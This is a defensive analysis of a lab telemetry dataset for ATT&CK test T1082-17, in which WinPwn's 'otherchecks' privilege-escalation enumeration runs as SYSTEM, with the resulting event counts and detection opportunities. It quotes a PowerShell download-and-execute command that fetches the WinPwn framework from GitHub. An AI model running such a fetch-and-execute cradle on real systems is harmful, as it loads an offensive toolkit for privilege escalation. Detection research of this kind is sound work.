# T1082-17: System Information Discovery — WinPwn - General Privesc Checks

## Technique Context

T1082 (System Information Discovery) encompasses host enumeration undertaken during post-exploitation to inform privilege escalation and lateral movement decisions. The `otherchecks` function in WinPwn aggregates general Windows privilege escalation checks beyond those covered by itm4n's focused module or PowerSploit's PowerUp. These "other checks" represent a collection of additional enumeration routines — token privilege analysis, AppLocker policy inspection, UAC configuration checks, AlwaysInstallElevated registry analysis, and similar broad system configuration review.

The framing as "general" checks distinguishes this from technique-specific modules: where `itm4nprivesc` targets a curated set of itm4n-researched vulnerabilities and `oldchecks` replicates PowerSploit, `otherchecks` broadens the coverage with supplementary enumeration categories that don't fit neatly into either prior module. Together, a threat actor running winPEAS, itm4nprivesc, oldchecks, and otherchecks in sequence would have covered most known Windows privilege escalation enumeration approaches.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `otherchecks` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) records the invocation:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput}
```

The Security channel (11 events) is minimal: all EID 4688 process creation events, consisting of `whoami.exe`, `powershell.exe` with the `otherchecks` invocation, and `mscorsvw.exe` workers. Of the T1082 WinPwn series, this has the smallest security event footprint alongside T1082-18.

The Sysmon channel (70 events) breaks down as: 41 EID 7 (image loads), 20 EID 11 (file creates), 3 EID 10 (process access), 3 EID 1 (process creates), 2 EID 17 (named pipe creates), and 1 EID 22 (DNS). The EID 7 count (41) is the highest in the entire T1082 WinPwn series — more than double the next highest (winPEAS at 15, oldchecks at 19, GeneralRecon at 61 total). This indicates that `otherchecks` loads a notably larger set of DLLs and .NET assemblies than the other general check modules.

The Sysmon EID 17 (named pipe create) records a PowerShell host pipe under SYSTEM:
```
PipeName: \PSHost.134180046791174765.5264.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: NT AUTHORITY\SYSTEM
```

The PowerShell channel (109 events: 107 EID 4104, 1 EID 4103, 1 EID 4100) follows the same pattern as the other T1082 WinPwn tests. The Sysmon EID 22 (DNS) event is present (1 event in the breakdown) indicating successful DNS resolution of `raw.githubusercontent.com`.

Compared to the defended dataset (38 sysmon, 11 security, 51 PowerShell events), this undefended capture shows slightly more activity (70 vs. 38 sysmon) with the primary difference being the elevated EID 7 image load count. The defended dataset likely had fewer image loads because Defender's AMSI intervention prevented some .NET assemblies from loading.

## What This Dataset Does Not Contain

The enumeration findings from `otherchecks` are console output only — not written to event logs or the file system. The specific checks performed (AppLocker inspection, UAC configuration reads, token privilege analysis) generate WMI queries and registry reads internally within the PowerShell process that are not captured as distinct events in this collection configuration.

No LSASS access, process injection, or credential-related events appear in this dataset — `otherchecks` is an enumeration module rather than a credential harvesting module.

The elevated EID 7 count (41 image loads) suggests the module loaded substantial managed code infrastructure, but the specific assemblies loaded are consistent with legitimate .NET framework components rather than standalone attack tools.

## Assessment

The distinguishing characteristic of T1082-17 within the WinPwn series is the elevated image load count: 41 EID 7 events vs. 15 for winPEAS, 10 for Safetykatz, and 19 for oldchecks. `otherchecks` loads more DLLs and .NET assemblies into the PowerShell process than any other single WinPwn module in this dataset series. This suggests the module's enumeration functions depend on a broader set of .NET types and Windows API libraries than the more focused modules.

The small Security log footprint (11 events, all EID 4688) indicates that `otherchecks` performs its work primarily through PowerShell cmdlets and .NET APIs rather than spawning subprocesses. The process access events (3 EID 10) show PowerShell accessing `whoami.exe` with full rights, consistent with the ART test framework behavior across all WinPwn tests.

This dataset is representative of the "broad sweep" category of post-exploitation enumeration — a single command that loads a framework in memory and runs a comprehensive set of checks without touching the file system beyond the .NET NGen cache.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — otherchecks WinPwn invocation:** The command line `otherchecks -noninteractive -consoleoutput` with the WinPwn GitHub URL is a direct indicator. The pinned commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` is shared across all T1082 WinPwn tests (T1082-14 through T1082-20), making it a campaign-level fingerprint.

**Sysmon EID 7 — 41 image loads in a PowerShell session:** The volume of DLL loads into a single PowerShell process in a short window is anomalous. Normal PowerShell scripts do not load 41 distinct assemblies. This pattern is consistent with a PowerShell-based offensive framework that uses .NET reflection to load multiple capability modules.

**Sysmon EID 17 — Named pipe creation under SYSTEM:** The PSHost pipe confirms non-interactive SYSTEM-level PowerShell execution. This appears across all WinPwn module tests as a consistent secondary indicator.

**Sysmon EID 22 — DNS to raw.githubusercontent.com:** The DNS resolution confirming download from GitHub's raw content CDN. Present in all T1082 WinPwn tests (1 event each in the breakdown).

**Cross-dataset pattern — WinPwn campaign fingerprint:** T1082-14 through T1082-20 all share the same WinPwn GitHub URL with the same commit hash, the same `iex(downloadstring(...))` loading pattern, and the same SYSTEM execution context. An analyst detecting any one of these tests can expect the others to appear as part of the same post-exploitation session.
